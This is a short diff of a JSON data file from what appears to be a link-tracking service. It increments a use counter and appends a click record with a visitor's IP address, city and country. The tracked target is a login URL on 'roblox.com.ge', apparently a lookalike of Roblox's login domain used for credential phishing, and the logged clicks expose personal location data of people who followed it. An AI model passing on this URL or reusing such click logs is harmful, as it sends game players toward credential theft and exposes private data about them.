@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 912,
+    "useCount": 913,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7416,6 +7416,14 @@
         "city": "Sainneville",
         "flag": "🇫🇷",
         "countryCode": "FR"
+      },
+      {
+        "timestamp": 1777198079613,
+        "ip": "112.198.231.15",
+        "country": "Philippines",
+        "city": "Cabanatuan City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
